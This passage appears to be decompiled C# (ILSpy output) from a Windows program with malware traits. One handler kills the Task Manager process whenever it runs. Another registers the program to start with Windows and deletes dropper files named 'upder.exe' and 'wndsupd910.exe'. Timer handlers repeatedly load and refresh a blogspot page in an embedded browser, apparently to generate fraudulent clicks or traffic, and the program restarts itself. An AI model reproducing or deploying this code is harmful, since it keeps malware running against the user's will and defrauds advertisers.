						IL_003c:
						num = 6;
						vmethod_6().Refresh();
						goto IL_0049;
						IL_0049:
						num = 7;
						vmethod_6().Refresh();
						goto IL_0056;
						IL_0056:
						num = 8;
						vmethod_6().Refresh();
						goto IL_0063;
						end_IL_0000_2:
						break;
					}
					ProjectData.ClearProjectError();
					num3 = 0;
					break;
				}
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 186;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_15(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0007;
					case 186:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0007;
							case 3:
								goto IL_0017;
							case 4:
								goto IL_0026;
							case 5:
								goto IL_002f;
							case 6:
								goto IL_003c;
							case 7:
								goto IL_0049;
							case 8:
								goto IL_0056;
							case 9:
								goto IL_0063;
							case 10:
							case 11:
								goto end_IL_0000_2;
							default:
								goto end_IL_0000;
							case 12:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_0063:
						num = 9;
						vmethod_8().Refresh();
						break;
						IL_0007:
						num = 2;
						int_2++;
						goto IL_0017;
						IL_0017:
						num = 3;
						if (int_2 != 300)
						{
							break;
						}
						goto IL_0026;
						IL_0026:
						num = 4;
						int_2 = 0;
						goto IL_002f;
						IL_002f:
						num = 5;
						vmethod_8().Refresh();
						goto IL_003c;
						IL_003c:
						num = 6;
						vmethod_8().Refresh();
						goto IL_0049;
						IL_0049:
						num = 7;
						vmethod_8().Refresh();
						goto IL_0056;
						IL_0056:
						num = 8;
						vmethod_8().Refresh();
						goto IL_0063;
						end_IL_0000_2:
						break;
					}
					ProjectData.ClearProjectError();
					num3 = 0;
					break;
				}
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 186;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_16(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0007;
					case 186:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0007;
							case 3:
								goto IL_0017;
							case 4:
								goto IL_0026;
							case 5:
								goto IL_002f;
							case 6:
								goto IL_003c;
							case 7:
								goto IL_0049;
							case 8:
								goto IL_0056;
							case 9:
								goto IL_0063;
							case 10:
							case 11:
								goto end_IL_0000_2;
							default:
								goto end_IL_0000;
							case 12:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_0063:
						num = 9;
						vmethod_10().Refresh();
						break;
						IL_0007:
						num = 2;
						int_3++;
						goto IL_0017;
						IL_0017:
						num = 3;
						if (int_3 != 300)
						{
							break;
						}
						goto IL_0026;
						IL_0026:
						num = 4;
						int_3 = 0;
						goto IL_002f;
						IL_002f:
						num = 5;
						vmethod_10().Refresh();
						goto IL_003c;
						IL_003c:
						num = 6;
						vmethod_10().Refresh();
						goto IL_0049;
						IL_0049:
						num = 7;
						vmethod_10().Refresh();
						goto IL_0056;
						IL_0056:
						num = 8;
						vmethod_10().Refresh();
						goto IL_0063;
						end_IL_0000_2:
						break;
					}
					ProjectData.ClearProjectError();
					num3 = 0;
					break;
				}
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 186;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_17(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		Process[] processes = default(Process[]);
		Process process = default(Process);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 128:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0018;
						case 4:
							goto IL_002f;
						case 5:
							goto IL_0038;
						case 6:
							goto IL_003c;
						case 7:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 8:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0038:
					num5 = checked(num5 + 1);
					goto IL_003c;
					IL_0007:
					num = 2;
					processes = Process.GetProcesses();
					num5 = 0;
					goto IL_003f;
					IL_003f:
					if (num5 >= processes.Length)
					{
						break;
					}
					process = processes[num5];
					goto IL_0018;
					IL_003c:
					num = 6;
					goto IL_003f;
					IL_0018:
					num = 3;
					if (Operators.CompareString(process.ProcessName, "taskmgr", false) == 0)
					{
						goto IL_002f;
					}
					goto IL_0038;
					IL_002f:
					num = 4;
					process.Kill();
					goto IL_0038;
					end_IL_0000_2:
					break;
				}
				ProjectData.ClearProjectError();
				num3 = 0;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 128;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_18(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 168:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0019;
						case 4:
							goto IL_0026;
						case 5:
							goto IL_0033;
						case 6:
							goto IL_0040;
						case 7:
							goto IL_004d;
						case 8:
							goto IL_005a;
						case 9:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 10:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_005a:
					num = 8;
					vmethod_28().Start();
					break;
					IL_0007:
					num = 2;
					vmethod_0().Navigate("http://clicksmadebykasfandman.blogspot.com/2012/07/can-you-solve-this-riddle-no-one.html");
					goto IL_0019;
					IL_0019:
					num = 3;
					vmethod_0().Refresh();
					goto IL_0026;
					IL_0026:
					num = 4;
					vmethod_0().Refresh();
					goto IL_0033;
					IL_0033:
					num = 5;
					vmethod_0().Refresh();
					goto IL_0040;
					IL_0040:
					num = 6;
					vmethod_0().Refresh();
					goto IL_004d;
					IL_004d:
					num = 7;
					vmethod_0().Refresh();
					goto IL_005a;
					end_IL_0000_2:
					break;
				}
				ProjectData.ClearProjectError();
				num3 = 0;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 168;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_19(object sender, EventArgs e)
	{
		try
		{
			startwithwin(((Form)this).get_Text(), Process.GetCurrentProcess().MainModule!.FileName);
			if (!Class7.smethod_1())
			{
				Class7.smethod_2(bool_0: true);
			}
			if (((ServerComputer)Class1.smethod_0()).get_FileSystem().FileExists(string_0 + "\\upder.exe"))
			{
				try
				{
					((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(string_0 + "\\upder.exe");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (((ServerComputer)Class1.smethod_0()).get_FileSystem().FileExists(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\wndsupd910.exe"))
			{
				try
				{
					((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\wndsupd910.exe");
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			method_5();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	private void method_20(object sender, EventArgs e)
	{
		checked
		{
			int_23++;
			if (int_23 == 30)
			{
				int_23 = 0;
				method_3();
			}
		}
	}

	private void method_21(object sender, EventArgs e)
	{
		checked
		{
			int_15++;
			if (int_15 == 10)
			{
				int_15 = 0;
				vmethod_28().Stop();
				method_9();
			}
		}
	}

	private void method_22(object sender, EventArgs e)
	{
		checked
		{
			int_17++;
			if (int_17 == 30)
			{
				int_17 = 0;
				vmethod_30().Stop();
				if (vmethod_0().get_Url().ToString().Contains("clicksmadebykasfandman"))
				{
					method_9();
				}
				else
				{
					vmethod_30().Start();
				}
			}
		}
	}

	private void method_23(object sender, EventArgs e)
	{
		checked
		{
			int_19++;
			if (int_19 == 28)
			{
				((ServerComputer)Class1.smethod_0()).get_FileSystem().WriteAllText(string_1 + "\\rstr.pr.tt.rr.b", "1", true);
			}
			if (int_19 == 30)
			{
				int_19 = 0;
				vmethod_32().Stop();
				Application.Restart();
			}
		}
	}

	private void method_24(object sender, EventArgs e)
	{
		checked
		{
			int_22++;
			if (int_22 == 10)
			{
				int_22 = 0;
				vmethod_40().Stop();
				method_6();
			}
		}
	}
}
